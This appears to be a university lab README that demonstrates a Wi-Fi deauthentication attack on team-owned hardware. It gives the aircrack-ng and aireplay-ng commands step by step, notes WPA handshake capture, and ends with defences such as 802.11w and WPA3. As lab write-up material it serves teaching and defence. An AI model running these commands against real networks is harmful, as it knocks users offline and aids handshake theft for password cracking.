# WiFi-Deauth-Lab# Wi-Fi Deauthentication Attack Lab

A physical security research lab demonstrating a **Wi-Fi deauthentication attack** in a controlled environment. Built as part of a university cybersecurity module (CST3535), this lab captures and analyses 802.11 management frames, replicates a real-world denial-of-service vector, and proposes concrete mitigations.

> ⚠️ **Educational use only.** All testing was conducted on equipment owned by the team in an isolated lab environment. Performing deauthentication attacks on networks without authorisation is illegal.

---

## 🎯 Objectives

- Demonstrate how 802.11 management frames can be exploited without authentication
- Capture and analyse deauth frames using Wireshark in monitor mode
- Evaluate Kali Linux tooling for wireless penetration testing
- Propose and test defences including 802.11w Protected Management Frames

---

## 🧪 Lab Setup

### Hardware

| Role | Device |
|---|---|
| Attacker | Kali Linux machine with Alfa AWUS036ACH wireless adapter |
| Target AP | Consumer Wi-Fi router |
| Victim client | Laptop / phone connected to target AP |
| Traffic capture | Raspberry Pi running Wireshark in monitor mode |

### Network Topology

```
[Victim Client] ←──── Wi-Fi ────→ [Target AP]
                                        ↑
                              [Attacker — Kali Linux]
                              sends forged deauth frames
                                        ↑
                              [Raspberry Pi — Wireshark]
                              captures all 802.11 frames
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `airmon-ng` | Enable monitor mode on wireless adapter |
| `airodump-ng` | Scan for nearby APs and clients |
| `aireplay-ng` | Send deauthentication frames |
| `Wireshark` | Capture and inspect 802.11 management frames |
| `Macchanger` | MAC address spoofing |
| `aircrack-ng` | WPA handshake capture and cracking |
| `hashcat` | GPU-accelerated password cracking |
| `Metasploit` | Post-exploitation framework |

---

## ⚙️ Attack Methodology

### 1. Enable Monitor Mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### 2. Scan for Target Networks
```bash
sudo airodump-ng wlan0mon
```

### 3. Capture Target Traffic
```bash
sudo airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon
```

### 4. Send Deauthentication Frames
```bash
sudo aireplay-ng --deauth 100 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

The `-a` flag specifies the AP, `-c` the target client. The `100` is the number of deauth packets sent. Setting `-c` to broadcast targets all connected clients simultaneously.

---

## 📊 Findings

- Deauth frames are **unauthenticated** in WPA2 — any device can send them spoofing the AP's MAC address
- Victim clients disconnect within milliseconds of receiving forged frames
- Wireshark clearly shows frame type `0x000C` (deauthentication) with reason code 7
- WPA handshakes can be captured by forcing client reconnection

---

## 🛡️ Defences & Mitigations

| Defence | Description |
|---|---|
| **802.11w (PMF)** | Management Frame Protection — cryptographically signs deauth frames, rendering spoofed frames invalid |
| **WPA3** | Includes PMF by default; upgrade where hardware supports it |
| **WPA2-Enterprise** | Per-user authentication prevents MAC spoofing attacks |
| **Disable WPS** | Removes PIN-based attack surface (Reaver) |
| **IDS/IPS monitoring** | Flag abnormal deauth frame rates as a DoS indicator |
| **Strong passphrases** | Mitigates dictionary attacks on captured WPA handshakes |

---

## 📄 Report

Full security report covers:
- WPA/WPA2/WPA3 protocol overview and attack surfaces
- Risk assessment and impact analysis
- Kali Linux tool selection rationale
- Comparison of Kali Linux vs Parrot OS for pen testing
- Complete hardware configuration for the attacker system

---

## 👥 Team

- Figo Figo (M00971570)
- Deep Patel (M00938680)
- Harnil Makwana (M00939940)
- Rathan Tudugani (M00967173)

**Module**: CST3535 — Middlesex University London, 2025–26

---

## 👤 Author Contact

**Figo Figo** — BSc Networking & Security, Middlesex University London  
🌐 [figo.me.uk](https://figo.me.uk) · 💼 [LinkedIn](https://www.linkedin.com/in/figo-figo-1204642b2)
